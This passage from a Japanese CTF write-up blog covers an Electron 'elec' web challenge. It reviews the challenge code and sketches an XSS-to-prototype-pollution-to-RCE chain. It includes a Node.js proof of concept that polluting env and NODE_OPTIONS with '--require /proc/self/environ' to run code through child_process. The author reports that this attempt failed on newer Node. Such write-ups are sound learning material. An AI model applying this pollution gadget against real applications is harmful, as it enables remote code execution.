+</span></span><span style=display:flex><span>    document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;content&#34;</span>).<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>sanitizeHtml</span>({{ .<span style=color:#a6e22e>Content</span> }}, {<span style=color:#a6e22e>allowedTags</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#34;p&#34;</span>, <span style=color:#e6db74>&#34;br&#34;</span>, <span style=color:#e6db74>&#34;hr&#34;</span>, <span style=color:#e6db74>&#34;a&#34;</span>, <span style=color:#e6db74>&#34;img&#34;</span>, <span style=color:#e6db74>&#34;blockquote&#34;</span>, <span style=color:#e6db74>&#34;ul&#34;</span>, <span style=color:#e6db74>&#34;ol&#34;</span>, <span style=color:#e6db74>&#34;li&#34;</span>],<span style=color:#a6e22e>allowedAttributes</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#39;*&#39;</span><span style=color:#f92672>:</span>[<span style=color:#e6db74>&#39;*&#39;</span>]}})
+</span></span><span style=display:flex><span>  &lt;/<span style=color:#f92672>script</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span><span style=display:flex><span>{{end}}
+</span></span></code></pre></div><p>状況を整理します。</p><ul><li>Preloadスクリプト及びElectronの内部ロジックは<code>webContents</code>と同じコンテキストで実行される</li><li>XSSが可能</li><li>flagはサーバ側の<code>/flag</code>にある</li></ul><p>これらを考慮するとXSSを介してPrototype Pollutionを行い、RCEに繋げてflagを取得することが想定できます。</p><p><code>elec-admin-console/src/preload.js</code>を見ると、<code>child_process</code>の<code>spawn</code>が実行されています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>spawn</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;node:child_process&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>window.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;load&#34;</span>, <span style=color:#66d9ef>async</span> () =&gt; {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>versions</span> <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>app</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;0.0.1&#34;</span>,
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>node</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>versions</span>.<span style=color:#a6e22e>node</span>,
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>chrome</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>versions</span>.<span style=color:#a6e22e>chrome</span>,
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>electron</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>versions</span>.<span style=color:#a6e22e>electron</span>,
+</span></span><span style=display:flex><span>	};
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>versions</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cp</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>spawn</span>(<span style=color:#e6db74>&#34;uname&#34;</span>, [<span style=color:#e6db74>&#34;-a&#34;</span>]);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>cp</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>kernelInfo</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>loadStream</span>(<span style=color:#a6e22e>cp</span>.<span style=color:#a6e22e>stdout</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;###############################################################################&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;###############################################################################&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>kernelInfo</span>.<span style=color:#a6e22e>toString</span>());
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;app-version&#34;</span>).<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>versions</span>.<span style=color:#a6e22e>app</span>;
+</span></span><span style=display:flex><span>	document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;node-version&#34;</span>).<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>versions</span>.<span style=color:#a6e22e>node</span>;
+</span></span><span style=display:flex><span>	document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;chrome-version&#34;</span>).<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>versions</span>.<span style=color:#a6e22e>chrome</span>;
+</span></span><span style=display:flex><span>	document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;electron-version&#34;</span>).<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>versions</span>.<span style=color:#a6e22e>electron</span>;
+</span></span><span style=display:flex><span>	document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;kernel-info&#34;</span>).<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>kernelInfo</span>.<span style=color:#a6e22e>toString</span>();
+</span></span><span style=display:flex><span>	document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;admin-footer&#34;</span>).<span style=color:#a6e22e>classList</span>.<span style=color:#a6e22e>remove</span>(<span style=color:#e6db74>&#34;d-none&#34;</span>);
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p>hacktricksの<a href=https://book.hacktricks.xyz/v/jp/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#woshitapp2rce>Prototype Pollution to RCE</a>の記事を眺めていると、<code>spawn</code>が使用されている場合に、環境変数を介してRCEを行う方法が書かれていました。</p><p>これは<code>spawn</code>などが実行される際に<code>options</code>として渡される<code>env</code>が指定されないことを利用するものです。</p><p><code>hoge.__proto__env</code>に<code>{"AAA": "console.log(123)//"}</code>などを入れ、<code>hoge.__proto__.NODE_OPTIONS</code>に<code>--require /proc/self/environ</code>を入れると、<code>console.log(123)//</code>が<code>/proc/self/environ</code>に追加された状態でnodejsのプログラムとして実行されます。コメントアウト<code>//</code>により<code>console.log(123)</code>以降は無視されるので、任意の処理を実行することができます。</p><p>これをまずローカルで試していましたが、どうも上手くいきませんでした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>fork</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;child_process&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Manual Pollution
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>b</span> <span style=color:#f92672>=</span> {}
+</span></span><span style=display:flex><span><span style=color:#a6e22e>b</span>.<span style=color:#a6e22e>__proto__</span>.<span style=color:#a6e22e>env</span> <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;AAAAAA&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;console.log(&#39;123&#39;)//&#34;</span>}
+</span></span><span style=display:flex><span><span style=color:#a6e22e>b</span>.<span style=color:#a6e22e>__proto__</span>.<span style=color:#a6e22e>NODE_OPTIONS</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;--require /proc/self/environ&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Trigger gadget
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>proc</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fork</span>(<span style=color:#e6db74>&#39;./a_file.js&#39;</span>);
+</span></span></code></pre></div><p>期待する結果</p><pre tabindex=0><code>$ node hoge.js 
+123
+</code></pre><p>実際</p><pre tabindex=0><code>$ node hoge.js 
+/proc/277/environ:1
+HOSTNAME=4659a0d0f88e
+         ^^^^
+
+SyntaxError: Invalid or unexpected token
+</code></pre><p>原因を探っていると、<code>options.env</code>が書き換えられていないことがわかりました。これは<code>options</code>が指定されない（<code>undefined</code>）の時に<code>options</code>に<code>kEmptyObject</code>を入れる処理に基づいています（<a href=https://github.com/nodejs/node/blob/main/lib/child_process.js#L567>該当部分のコード</a>）。</p><p>どうやらv18.4.0から実装されたようです（<a href=https://book.hacktricks.xyz/v/jp/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#toshinai>参考</a>）。</p><p>ここで、spawnを利用してPrototype Pollution to RCEを実現するのは無理だ&mldr;となり終了しました。</p><p>他の方のwriteupを見ていると、<code>const cp = spawn("uname", ["-a"]);console.log(cp);</code>に着目し、<code>console.log</code>を書き換えることでRCEを行っていました。
+<a href=https://blog.hamayanhamayan.com/entry/2024/06/23/212226#Web-elec>https://blog.hamayanhamayan.com/entry/2024/06/23/212226#Web-elec</a></p><p>この着眼点が欲しい&mldr;（これに気付けていてもRCEまでできるガチャガチャ力がない気がする）</p><h1 id=おわりに>おわりに</h1><p>ボス問のtls-specは見れていないですが、個人的にはNoscriptとelecが好きでした。</p><p>特に自分はelectronのセキュリティ機構について全く知らなかったので、これを機会に学ぶことができてよかったです。</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
